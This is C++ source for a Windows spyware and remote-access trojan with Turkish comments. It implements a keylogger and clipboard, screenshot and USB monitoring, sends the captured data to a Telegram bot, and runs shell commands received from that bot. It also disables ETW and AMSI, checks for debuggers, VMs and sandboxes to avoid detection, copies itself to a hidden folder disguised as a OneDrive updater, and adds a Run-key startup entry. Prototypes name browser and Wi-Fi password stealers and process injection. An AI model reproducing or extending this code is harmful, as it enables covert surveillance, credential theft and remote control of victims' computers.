#define _WIN32_WINNT 0x0600
#define WINVER 0x0600

#include "evasion.h"
#include "persistence.h"
#include "stealers.h"
#include <algorithm>
#include <ctime>
#include <fstream>
#include <gdiplus.h>
#include <shlobj.h>
#include <sstream>
#include <string>
#include <tlhelp32.h>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <winternl.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")

// New Modules
#include "config.h"
#include "threadpool.h"
#include "network.h"

// Lazy GDI+
static bool g_gdiplusLoaded = false;
static ULONG_PTR g_gdiplusToken = 0;

bool EnsureGdiPlus() {
    if (g_gdiplusLoaded) return true;
    
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    if (Gdiplus::GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL) == Gdiplus::Ok) {
        g_gdiplusLoaded = true;
        return true;
    }
    return false;
}

// ==================== AYARLAR ====================
// Build.bat uzerinden .env dosyasindan okunarak enjekte edilir.
#ifndef TELEGRAM_BOT_TOKEN
#define TELEGRAM_BOT_TOKEN "TOKEN_NOT_DEFINED"
#endif

#ifndef TELEGRAM_CHAT_ID
#define TELEGRAM_CHAT_ID "CHAT_ID_NOT_DEFINED"
#endif

// Eski const tanimlamalar yerine artik direkt makrolari kullaniyoruz,
// ama kodun geri kalani degisken bekledigi icin alias olusturabiliriz
// veya direkt string literal olarak kullanilabilirler.
const char *BOT_TOKEN = TELEGRAM_BOT_TOKEN;
const char *CHAT_ID = TELEGRAM_CHAT_ID;

// ==================== PERFORMANCE TUNING ====================
// Bu degerler config.h icinde tanimli
/*
const int REPORT_INTERVAL = 120;
const int SCREENSHOT_INTERVAL = 300;
const int COMMAND_POLL_INTERVAL = 45000;
const int CLIPBOARD_CHECK_INTERVAL = 2000;
*/

// ==================== GLOBAL DEGISKENLER ====================
std::string g_keyBuffer;
std::string g_clipboardBuffer;
std::string g_usbBuffer;
std::string g_currentWindow;
std::string g_lastClipboard;
std::string g_hiddenPath;
std::string g_tempFolder;
std::vector<std::string> g_screenshotPaths;
HHOOK g_keyboardHook = NULL;
bool g_running = true;
time_t g_startTime;
time_t g_lastReportTime;
time_t g_lastScreenshotTime;
// ULONG_PTR g_gdiplusToken removed (lazy loaded)

// ==================== THREAD-SAFETY & TUS KUYRUĞU ====================
CRITICAL_SECTION g_keyBufferLock;
CRITICAL_SECTION g_keyQueueLock;

// Tuş kuyruğu yapısı - hook'tan hızlıca alıp ayrı thread'de işleme
struct KeyEvent {
  DWORD vkCode;
  bool shift;
  bool ctrl;
  bool alt;
  bool caps;
  DWORD timestamp;
};

// ==================== RING BUFFER (Performans Optimizasyonu) ====================
#define KEY_RING_BUFFER_SIZE 1024
static KeyEvent g_keyRingBuffer[KEY_RING_BUFFER_SIZE];
static volatile LONG g_keyRingHead = 0;  // Producer writes here
static volatile LONG g_keyRingTail = 0;  // Consumer reads from here
HANDLE g_keyQueueEvent = NULL;

// ==================== NETWORK BATCHING (Performans Optimizasyonu) ====================
CRITICAL_SECTION g_pendingMessagesLock;
std::vector<std::string> g_pendingMessages;  // Batch için bekleyen mesajlar

// ==================== FONKSIYON PROTOTIPLERI ====================
void HideConsole();
void HideInSystem();
void AddToStartup();
bool SendTelegramMessage(const std::string &message);
void QueueTelegramMessage(const std::string &message); // Network Batching
std::string GetCurrentTimeStamp();  // Formatting Helper
std::string GetActiveWindowTitle();
void StartKeylogger();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
std::string KeyCodeToString(DWORD vkCode, bool shift, bool ctrl, bool alt, bool win);
void ReportLoop();
bool IsDebuggerAttached();
bool IsVirtualMachine();
bool IsSandbox();

// Faz 1 fonksiyonlari
void ClipboardMonitorLoop();
void ScreenshotLoop();
void USBMonitorLoop();
std::string CaptureScreen();
std::vector<std::string> GetConnectedUSBDevices();

// Faz 2 fonksiyonlari
bool SendTelegramPhoto(const std::string &path, const std::string &caption);
bool SendTelegramDocument(const std::string &path, const std::string &caption);
void RemoteCommandLoop();
void ProcessCommands(const std::string &json);
void ExecuteCommand(const std::string &cmd);
std::string GetSystemInfo();
void SendReport(bool manual);

// Faz 3 fonksiyonlari
void GetWifiPasswords();
void GetBrowserPasswords();
void DownloadFile(const std::string &path);

// Faz 4 fonksiyonlari
void StartWatchdog();
void WatchdogLoop();
void MultiPersistence();
void SelfProtection();
void BackupSelf();
void RestoreSelf();

// Faz 5 fonksiyonlari
bool AdvancedSandboxDetection();
void MakePolymorphic();
bool CheckIntegrity();
std::string Obfuscate(const std::string &str);
std::string Deobfuscate(const std::string &str);
void RandomDelay();

// Faz 6 fonksiyonlari (ileri duzey)
bool ProcessHollow(const char *targetProcess, const char *payloadPath);
bool InjectDLL(DWORD pid, const char *dllPath);
bool InjectShellcode(DWORD pid);
DWORD FindTargetProcess(const char *processName);
bool RunAsLegitProcess();

// Globals for remote control
long long g_lastUpdateId = 0;
std::string g_backupPath;
bool g_isWatchdog = false;
const std::string XOR_KEY = "BYPASS_DEF_2025_V2";

// ==================== TELEGRAM: ESKİ MESAJLARI ATLA ====================
// Program başladığında eski komutları çalıştırmamak için
// TÜM mevcut mesajları al ve en yüksek update_id'yi kaydet
void SkipOldTelegramMessages() {
  HINTERNET hInternet = InternetOpenA(
      "Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  if (!hInternet) return;

  HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org",
                                        INTERNET_DEFAULT_HTTPS_PORT, NULL,
                                        NULL, INTERNET_SERVICE_HTTP, 0, 0);
  if (!hConnect) {
    InternetCloseHandle(hInternet);
    return;
  }

  // ÖNCE WEBHOOK'U SİL (varsa getUpdates çalışmaz!)
  std::string deletePath =
      "/bot" + std::string(TELEGRAM_BOT_TOKEN) +
      "/deleteWebhook";
  HINTERNET hDelRequest = HttpOpenRequestA(hConnect, "GET", deletePath.c_str(), NULL,
                                        NULL, NULL, INTERNET_FLAG_SECURE, 0);
  if (hDelRequest) {
    HttpSendRequestA(hDelRequest, NULL, 0, NULL, 0);
    InternetCloseHandle(hDelRequest);
  }
  
  // TÜM bekleyen mesajları al (offset yok = baştan itibaren)
  std::string path =
      "/bot" + std::string(TELEGRAM_BOT_TOKEN) +
      "/getUpdates?timeout=1";
  HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path.c_str(), NULL,
                                        NULL, NULL, INTERNET_FLAG_SECURE, 0);

  if (hRequest && HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
    char buffer[8192];
    DWORD bytesRead;
    std::string response;

    while (
        InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) &&
        bytesRead > 0) {
      buffer[bytesRead] = '\0';
      response += buffer;
    }

    // TÜM update_id'leri bul ve en yükseğini al
    long long maxUpdateId = 0;
    size_t pos = 0;
    while ((pos = response.find("\"update_id\":", pos)) != std::string::npos) {
      pos += 12;
      size_t end = response.find_first_of(",}", pos);
      if (end != std::string::npos) {
        try {
          long long uid = std::stoll(response.substr(pos, end - pos));
          if (uid > maxUpdateId) {
            maxUpdateId = uid;
          }
        } catch (...) {
          // Parse hatası, devam et
        }
      }
    }
    
    // En yüksek ID'yi kaydet - RemoteCommandLoop offset=maxUpdateId+1 kullanacak
    if (maxUpdateId > 0) {
      g_lastUpdateId = maxUpdateId;
    }
  }

  if (hRequest) InternetCloseHandle(hRequest);
  InternetCloseHandle(hConnect);
  InternetCloseHandle(hInternet);
}

// ==================== HELPER ====================
void ExecCommand(const std::string &cmd) {
  std::string fullCmd = "cmd.exe /c " + cmd;
  STARTUPINFOA si = {sizeof(si)};
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  PROCESS_INFORMATION pi;

  if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, FALSE,
                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
  }
}

// ==================== MAIN ====================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
  // CRITICAL: Ana thread (Keylogger) en yüksek önceliğe sahip olmalı
  SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_ABOVE_NORMAL);

  // CRITICAL SECTIONS INITIALIZATION (Race condition önleme)
  InitializeCriticalSection(&g_keyBufferLock);
  InitializeCriticalSection(&g_keyQueueLock);
  InitializeCriticalSection(&g_pendingMessagesLock);
  g_keyQueueEvent = CreateEventA(NULL, TRUE, FALSE, NULL);

  // JUNK CODE: Statik analizi sasirtmak icin
  volatile int junk = 0;
  for (int i = 0; i < 100; i++) {
    junk += i * 2;
    junk ^= 0xFF;
  }
  if (junk == 99999)
    return 0; // Asla gerceklesmez

  // Watchdog modu?
  if (lpCmdLine && strstr(lpCmdLine, "-watchdog")) {
    g_isWatchdog = true;
    WatchdogLoop();
    return 0;
  }

  // ==================== EVASION INITIALIZATION ====================
  // 1. ETW'yi devre disi birak (Event Tracing for Windows)
  DisableETW();
  DisableNtTraceEvent();

  // 2. AMSI'yi devre disi birak (Antimalware Scan Interface)
  DisableAMSI();

  // 3. Thread'i debugger'dan gizle
  HideThreadFromDebugger();

  // ==================== GÜVENLİK KONTROLLERİ ====================
  // Rastgele gecikme (davranissal analiz)
  RandomDelay();

  // Anti-debug kontrolu
  if (IsDebuggerAttached())
    return 0;

  // VM kontrolu
  if (IsVirtualMachine())
    return 0;

  // Sandbox kontrolu (temel + gelismis)
  if (IsSandbox())
    return 0;
  if (AdvancedSandboxDetection())
    return 0;

  // Integrity kontrolu
  if (!CheckIntegrity())
    return 0;

  // Ek gecikme (sandbox timeout - azaltildi)
  Sleep(1000);

  // Polimorfik mutasyon
  MakePolymorphic();

  // Konsolu gizle
  HideConsole();

  // GDI+ lazy loaded, burada gerek yok (EnsureGdiPlus)

  // Temp klasor olustur
  char tempPath[MAX_PATH];
  GetTempPathA(MAX_PATH, tempPath);
  g_tempFolder =
      std::string(tempPath) + "mstemp_" + std::to_string(GetTickCount());
  CreateDirectoryA(g_tempFolder.c_str(), NULL);

  // Kendini gizle
  HideInSystem();

  // Coklu persistence
  MultiPersistence();

  // Backup olustur
  BackupSelf();

  // Watchdog baslat
  StartWatchdog();

  // Zamanlari ayarla
  g_startTime = time(NULL);
  g_lastReportTime = time(NULL);
  g_lastScreenshotTime = time(NULL);

  // Baslangic bildirimi
  char hostname[256];
  DWORD size = sizeof(hostname);
  GetComputerNameA(hostname, &size);

  char username[256];
  size = sizeof(username);
  GetUserNameA(username, &size);

  std::stringstream ss;
  ss << "🔰 *SYSTEM ONLINE* 🔰\n\n";
  ss << "🖥️ *Host:* `" << hostname << "`\n";
  ss << "👤 *User:* `" << username << "`\n";
  ss << "🕒 *Time:* `" << GetCurrentTimeStamp() << "`\n";
  ss << "🛡️ *Version:* `Elite v2.1`\n";
  ss << "⚙️ *Interval:* `" << REPORT_INTERVAL << "s`";
  SendTelegramMessage(ss.str());

  // Thread'leri baslat
  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReportLoop, NULL, 0, NULL);
  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClipboardMonitorLoop, NULL, 0,
               NULL);
  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ScreenshotLoop, NULL, 0, NULL);
  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)USBMonitorLoop, NULL, 0, NULL);
  
  // Telegram'daki eski mesajları atla (eski komutları çalıştırma)
  SkipOldTelegramMessages();
  
  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RemoteCommandLoop, NULL, 0,
               NULL);

  // Keylogger'i baslat
  StartKeylogger();

  // GDI+ kapat (sadece başlatıldıysa)
  if (g_gdiplusLoaded) {
    Gdiplus::GdiplusShutdown(g_gdiplusToken);
  }

  return 0;
}

// ==================== KONSOL GIZLE ====================
void HideConsole() {
  HWND hwnd = GetConsoleWindow();
  if (hwnd) {
    ShowWindow(hwnd, SW_HIDE);
  }

  // Pencereyi tamamen gizle
  FreeConsole();
}

// ==================== KENDINI GIZLE ====================
void HideInSystem() {
  char currentPath[MAX_PATH];
  GetModuleFileNameA(NULL, currentPath, MAX_PATH);

  char appData[MAX_PATH];
  SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData);

  // EVASION: Neutral 3rd-party app name (Windows component değil)
  std::string targetDir =
      std::string(appData) + "\\Microsoft\\OneDrive\\Update";
  std::string targetPath = targetDir + "\\OneDriveUpdater.exe";

  // Zaten gizli konumdaysa devam et
  if (std::string(currentPath) == targetPath) {
    g_hiddenPath = targetPath;
    return;
  }

  // Klasor olustur
  CreateDirectoryA(targetDir.c_str(), NULL);

  // Dosyayi kopyala
  CopyFileA(currentPath, targetPath.c_str(), FALSE);

  // Gizli yap
  SetFileAttributesA(targetDir.c_str(),
                     FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
  SetFileAttributesA(targetPath.c_str(),
                     FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

  g_hiddenPath = targetPath;

  // Yeni konumdan baslat
  STARTUPINFOA si = {sizeof(si)};
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  PROCESS_INFORMATION pi;

  if (CreateProcessA(targetPath.c_str(), NULL, NULL, NULL, FALSE,
                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ExitProcess(0);
  }
}

// ==================== BASLANGICA EKLE ====================
void AddToStartup() {
  HKEY hKey;
  if (RegOpenKeyExA(HKEY_CURRENT_USER,
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                    KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
    // EVASION: Neutral registry key name
    RegSetValueExA(hKey, "OneDriveUpdate", 0, REG_SZ,
                   (BYTE *)g_hiddenPath.c_str(), g_hiddenPath.length() + 1);
    RegCloseKey(hKey);
  }
}

// ==================== TELEGRAM MESAJ ====================
bool SendTelegramMessage(const std::string &message) {
  // Connection Pooling: Global baglanti havuzunu kullan
  NETWORK.Lock();
  HINTERNET hConnect = NETWORK.GetConnection();
  
  if (!hConnect) {
    NETWORK.Unlock();
    return false;
  }

  std::string path = "/bot" + std::string(TELEGRAM_BOT_TOKEN) + "/sendMessage";

  HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL,
                                        NULL, NULL, INTERNET_FLAG_SECURE, 0);
  if (!hRequest) {
    // Baglanti kopmus olabilir, resetle ve tekrar dene (1 kez)
    NETWORK.Reset();
    hConnect = NETWORK.GetConnection();
    if (hConnect) {
      hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL,
                                        NULL, NULL, INTERNET_FLAG_SECURE, 0);
    }
  }

  if (!hRequest) {
    NETWORK.Unlock();
    return false;
  }

  std::string headers = "Content-Type: application/x-www-form-urlencoded";
  std::string postData = "chat_id=" + std::string(TELEGRAM_CHAT_ID) +
                         "&text=" + message + "&parse_mode=Markdown";

  bool result = HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                                 (LPVOID)postData.c_str(), postData.length());

  InternetCloseHandle(hRequest);
  NETWORK.Unlock(); // Lock'i birak, baglanti acik kalsin
  
  return result;
}

// ==================== AKTIF PENCERE ====================
std::string GetActiveWindowTitle() {
  char title[256];
  HWND hwnd = GetForegroundWindow();
  GetWindowTextA(hwnd, title, sizeof(title));
  return std::string(title);
}

// ==================== KEYLOGGER ====================

// Tuş kuyruğunu işleyen thread (Ring Buffer versiyonu)
DWORD WINAPI ProcessKeyQueue(LPVOID lpParam) {
  std::string lastWindow;

  while (g_running) {
    // Kuyrukta tuş var mı bekle (max 100ms)
    WaitForSingleObject(g_keyQueueEvent, 100);

    // Ring buffer'dan tuşları al (lock-free read)
    LONG tail = g_keyRingTail;
    LONG head = InterlockedCompareExchange(&g_keyRingHead, 0, 0);  // Atomic read
    
    if (tail == head) {
      ResetEvent(g_keyQueueEvent);
      continue;  // Buffer boş
    }

    // Tuşları işle
    std::string keysToAdd;
    keysToAdd.reserve(256);  // Pre-allocate for performance

    while (tail != head) {
      KeyEvent evt = g_keyRingBuffer[tail];
      tail = (tail + 1) % KEY_RING_BUFFER_SIZE;

      // Aktif pencere kontrolü
      std::string activeWindow = GetActiveWindowTitle();
      if (activeWindow != lastWindow && !activeWindow.empty()) {
        lastWindow = activeWindow;

        time_t now = time(NULL);
        tm *ltm = localtime(&now);
        char timeStr[32];
        strftime(timeStr, sizeof(timeStr), "%H:%M:%S", ltm);

        keysToAdd +=
            "\n[" + std::string(timeStr) + "] === " + activeWindow + " ===\n";
      }

      // Tuşu string'e çevir (kombinasyonlar dahil)
      bool win = (GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000);
      std::string key = KeyCodeToString(evt.vkCode, evt.shift, evt.ctrl, evt.alt, win);
      keysToAdd += key;
    }

    // Tail'i güncelle (consumer commit)
    InterlockedExchange(&g_keyRingTail, tail);
    ResetEvent(g_keyQueueEvent);

    // Buffer'a ekle (thread-safe)
    if (!keysToAdd.empty()) {
      EnterCriticalSection(&g_keyBufferLock);
      g_keyBuffer += keysToAdd;
      LeaveCriticalSection(&g_keyBufferLock);
    }
  }
  return 0;
}

// ==================== FORMATTING HELPERS ====================
std::string GetCurrentTimeStamp() {
  time_t now = time(NULL);
  tm *ltm = localtime(&now);
  char buffer[64];
  strftime(buffer, sizeof(buffer), "%d.%m.%Y %H:%M:%S", ltm);
  return std::string(buffer);
}

void StartKeylogger() {
  // Critical section'lar artik WinMain'de baslatiliyor
  // g_keyQueueEvent = CreateEventA(NULL, TRUE, FALSE, NULL); // Zaten WinMain'de olacak

  // Tuş işleme thread'ini başlat (Sadece Hook modunda başlat, Polling'de loop içinde işlenir)
#if !KEYBOARD_USE_POLLING
  CreateThread(NULL, 0, ProcessKeyQueue, NULL, 0, NULL);
#endif

#if KEYBOARD_USE_POLLING
  // ==================== EVASION MODE: POLLING ====================
  // GetAsyncKeyState kullanarak hook'suz tuş yakalama
  // Daha az şüpheli ama bazı tuşları kaçırabilir
  
  BYTE keyStates[256] = {0};
  BYTE prevKeyStates[256] = {0};
  
  while (g_running) {
    // Tüm tuşları kontrol et
    for (int vk = 8; vk < 256; vk++) {
      keyStates[vk] = (GetAsyncKeyState(vk) & 0x8000) ? 1 : 0;
      
        if (keyStates[vk] && !prevKeyStates[vk]) {
          // Direct Write (Thread kullanmadan) - Çok daha stabil
          
          bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
          bool ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
          bool alt = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
          bool win = (GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000);
          
          std::string key = KeyCodeToString(vk, shift, ctrl, alt, win);
          
          if (!key.empty()) {
            EnterCriticalSection(&g_keyBufferLock);
            g_keyBuffer += key;
            LeaveCriticalSection(&g_keyBufferLock);
          }
        }
      prevKeyStates[vk] = keyStates[vk];
    }
    
    // Polling hızı - daha yüksek CPU ama daha az şüpheli
    Sleep(5);  // 200 Hz polling (Daha hassas)
  }
#else
  // ==================== STANDARD MODE: HOOK ====================
  // Hook'u kur
  g_keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

  if (!g_keyboardHook) {
    return;
  }

  // Non-blocking mesaj döngüsü (daha hızlı tepki)
  // Non-blocking mesaj döngüsü (PeekMessage daha güvenilir)
  MSG msg;
  while (g_running) {
    // PeekMessage ile mesajlari işle
    while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
      if (msg.message == WM_QUIT) {
        g_running = false;
        break;
      }
      TranslateMessage(&msg);
      DispatchMessage(&msg);
    }
    
    // CPU kullanımını düşür (1ms yeterli, 10ms hook lag yapabilir)
    Sleep(1);
  }

  UnhookWindowsHookEx(g_keyboardHook);
#endif

  // Temizlik
  DeleteCriticalSection(&g_keyBufferLock);
  DeleteCriticalSection(&g_keyQueueLock);
  DeleteCriticalSection(&g_pendingMessagesLock);  // Network batching temizliği
  CloseHandle(g_keyQueueEvent);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
  // Hook callback'i mümkün olduğunca hızlı tut!
  // Ring buffer kullanarak lock-free yazma

  if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
    KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;

    // Ring buffer'a ekle (lock-free)
    LONG head = g_keyRingHead;
    LONG nextHead = (head + 1) % KEY_RING_BUFFER_SIZE;
    
    // Buffer dolu mu kontrol et (tail'e yazmayı engelle)
    if (nextHead != g_keyRingTail) {
      // Hızlıca modifier durumlarını yakala
      g_keyRingBuffer[head].vkCode = kbd->vkCode;
      g_keyRingBuffer[head].shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
      g_keyRingBuffer[head].ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
      g_keyRingBuffer[head].alt = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
      g_keyRingBuffer[head].caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
      g_keyRingBuffer[head].timestamp = kbd->time;
      
      // Head'i atomik olarak ilerlet (commit)
      InterlockedExchange(&g_keyRingHead, nextHead);
      SetEvent(g_keyQueueEvent);
    }
    // Buffer doluysa tuşu drop et (performans için)
  }

  // Hook zincirini HEMEN devam ettir - gecikmeden!
  return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

std::string KeyCodeToString(DWORD vkCode, bool shift, bool ctrl, bool alt, bool win) {
  // Modifier tuşlarını tek başına basıldığında gösterme
  if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
      vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
      vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
      vkCode == VK_LWIN || vkCode == VK_RWIN || vkCode == VK_CAPITAL) {
    return "";
  }

  // Kombinasyon prefix'ini oluştur
  std::string prefix;
  if (win) prefix += "[WIN+";
  else if (ctrl && alt) prefix += "[CTRL+ALT+";
  else if (ctrl) prefix += "[CTRL+";
  else if (alt) prefix += "[ALT+";

  // Özel tuş kombinasyonları
  switch (vkCode) {
  case VK_TAB:
    if (alt) return "[ALT+TAB]";
    if (ctrl) return "[CTRL+TAB]";
    return "[TAB]";
  case VK_ESCAPE:
    if (ctrl && alt) return "[CTRL+ALT+ESC]";
    if (alt) return "[ALT+ESC]";
    if (ctrl) return "[CTRL+ESC]";
    return "[ESC]";
  case VK_BACK:
    if (ctrl) return "[CTRL+BS]";
    if (alt) return "[ALT+BS]";
    return "[BS]";
  case VK_RETURN:
    if (ctrl) return "[CTRL+ENTER]\n";
    if (alt) return "[ALT+ENTER]\n";
    return "[ENTER]\n";
  case VK_SPACE:
    if (ctrl) return "[CTRL+SPACE]";
    if (alt) return "[ALT+SPACE]";
    return " ";
  case VK_DELETE:
    if (ctrl && alt) return "[CTRL+ALT+DEL]";
    if (ctrl) return "[CTRL+DEL]";
    if (shift) return "[SHIFT+DEL]";
    return "[DEL]";
  case VK_INSERT:
    if (ctrl) return "[CTRL+INS]";
    if (shift) return "[SHIFT+INS]";
    return "[INS]";
  case VK_HOME:
    if (ctrl) return "[CTRL+HOME]";
    return "[HOME]";
  case VK_END:
    if (ctrl) return "[CTRL+END]";
    return "[END]";
  case VK_PRIOR: // Page Up
    if (ctrl) return "[CTRL+PGUP]";
    return "[PGUP]";
  case VK_NEXT:  // Page Down
    if (ctrl) return "[CTRL+PGDN]";
    return "[PGDN]";
  case VK_LEFT:
    if (ctrl) return "[CTRL+←]";
    return "[←]";
  case VK_RIGHT:
    if (ctrl) return "[CTRL+→]";
    return "[→]";
  case VK_UP:
    if (ctrl) return "[CTRL+↑]";
    return "[↑]";
  case VK_DOWN:
    if (ctrl) return "[CTRL+↓]";
    return "[↓]";
  case VK_SNAPSHOT: // Print Screen
    if (alt) return "[ALT+PRTSC]";
    return "[PRTSC]";
  case VK_PAUSE:
    if (ctrl) return "[CTRL+BREAK]";
    return "[PAUSE]";
  }

  // Harfler için kombinasyon desteği
  if (vkCode >= 'A' && vkCode <= 'Z') {
    char c = (char)vkCode;
    
    // Win+ kombinasyonları
    if (win) {
      return std::string("[WIN+") + c + "]";
    }
    
    // Ctrl+ kombinasyonları (önemli kısayollar)
    if (ctrl && !alt) {
      return std::string("[CTRL+") + c + "]";
    }
    
    // Alt+ kombinasyonları
    if (alt && !ctrl) {
      return std::string("[ALT+") + c + "]";
    }
    
    // Ctrl+Alt+ kombinasyonları
    if (ctrl && alt) {
      return std::string("[CTRL+ALT+") + c + "]";
    }
    
    // Normal harf
    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    bool upper = shift ^ caps;
    if (!upper) c = (char)tolower((unsigned char)c);
    return std::string(1, c);
  }

  // Sayılar için kombinasyon desteği
  if (vkCode >= '0' && vkCode <= '9') {
    char c = (char)vkCode;
    
    if (win) return std::string("[WIN+") + c + "]";
    if (ctrl) return std::string("[CTRL+") + c + "]";
    if (alt) return std::string("[ALT+") + c + "]";
    
    if (shift) {
      const char *shiftNums = ")!@#$%^&*(";
      return std::string(1, shiftNums[vkCode - '0']);
    }
    return std::string(1, c);
  }

  // F tuslari
  if (vkCode >= VK_F1 && vkCode <= VK_F12) {
    std::string fKey = "F" + std::to_string(vkCode - VK_F1 + 1);
    if (ctrl && alt) return "[CTRL+ALT+" + fKey + "]";
    if (ctrl && shift) return "[CTRL+SHIFT+" + fKey + "]";
    if (alt && shift) return "[ALT+SHIFT+" + fKey + "]";
    if (ctrl) return "[CTRL+" + fKey + "]";
    if (alt) return "[ALT+" + fKey + "]";
    if (shift) return "[SHIFT+" + fKey + "]";
    return "[" + fKey + "]";
  }

  // Numpad
  if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9) {
    return std::string(1, '0' + (vkCode - VK_NUMPAD0));
  }

  // Ozel karakterler
  switch (vkCode) {
  case VK_OEM_1:
    return shift ? ":" : ";";
  case VK_OEM_PLUS:
    return shift ? "+" : "=";
  case VK_OEM_COMMA:
    return shift ? "<" : ",";
  case VK_OEM_MINUS:
    return shift ? "_" : "-";
  case VK_OEM_PERIOD:
    return shift ? ">" : ".";
  case VK_OEM_2:
    return shift ? "?" : "/";
  case VK_OEM_3:
    return shift ? "~" : "`";
  case VK_OEM_4:
    return shift ? "{" : "[";
  case VK_OEM_5:
    return shift ? "|" : "\\";
  case VK_OEM_6:
    return shift ? "}" : "]";
  case VK_OEM_7:
    return shift ? "\"" : "'";
  case VK_MULTIPLY:
    return "*";
  case VK_ADD:
    return "+";
  case VK_SUBTRACT:
    return "-";
  case VK_DECIMAL:
    return ".";
  case VK_DIVIDE:
    return "/";
  }

  return "";
}

// ==================== RAPOR ====================
void ReportLoop() {
  // Düşük öncelik - Ana polling döngüsünü engellemesin
  SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);

  // Jitter hesaplama (her döngüde değil, gönderimden sonra değişecek)
  int currentJitter = 0;

  while (g_running) {
    Sleep(1000); // 1 saniye bekle ve kontrol et

    // ==================== BATCH MESSAGES (Performans Optimizasyonu) ====================
    // Kuyrukta bekleyen mesajları anında gönder (Jitter'dan etkilenmesin)
    // Bu sayede "Komut output gelmiyor" sorunu çözülür
    std::vector<std::string> messagesToSend;
    EnterCriticalSection(&g_pendingMessagesLock);
    if (!g_pendingMessages.empty()) {
      messagesToSend.swap(g_pendingMessages);
    }
    LeaveCriticalSection(&g_pendingMessagesLock);
    
    // Bekleyen mesajları ThreadPool üzerinden gönder
    for (const auto& msg : messagesToSend) {
      POOL.Submit([msg]() {
        SendTelegramMessage(msg);
      });
    }

    time_t now = time(NULL);

    // Thread-safe: buffer'ları kopyala ve AYNI ANDA temizle
    std::string keysCopy;
    std::string clipCopy;
    std::string usbCopy;
    
    EnterCriticalSection(&g_keyBufferLock);
    keysCopy = g_keyBuffer;
    
    // Screenshot paths kopyala ve temizle (Thread-safe)
    std::vector<std::string> screenshotsToSend = g_screenshotPaths;
    g_screenshotPaths.clear();
    
    // EVASION: Interval + Jitter kontrolü (DEBUG: azaltılmış jitter)
    if (currentJitter == 0) {
        currentJitter = (rand() % 2000) + 1000; // 1-3 sn jitter (DEBUG)
    }

    bool shouldReport = (now - g_lastReportTime >= (REPORT_INTERVAL + (currentJitter / 1000)));
    
    if (shouldReport && !g_keyBuffer.empty()) {
      g_keyBuffer.clear();  // Buffer'ı temizle
      currentJitter = 0;    // Jitter'ı sıfırla (sonraki turda yeni hesaplansın)
    }
    LeaveCriticalSection(&g_keyBufferLock);
    
    // Clipboard ve USB için de kopyala
    clipCopy = g_clipboardBuffer;
    usbCopy = g_usbBuffer;

    bool hasData = !keysCopy.empty() || !clipCopy.empty() ||
                   !usbCopy.empty() || !screenshotsToSend.empty();

    if (shouldReport && hasData) {
      double uptime = difftime(now, g_startTime) / 60.0;

      std::stringstream msg;
      msg << "📑 *ACTIVITY REPORT* 📑\n\n";
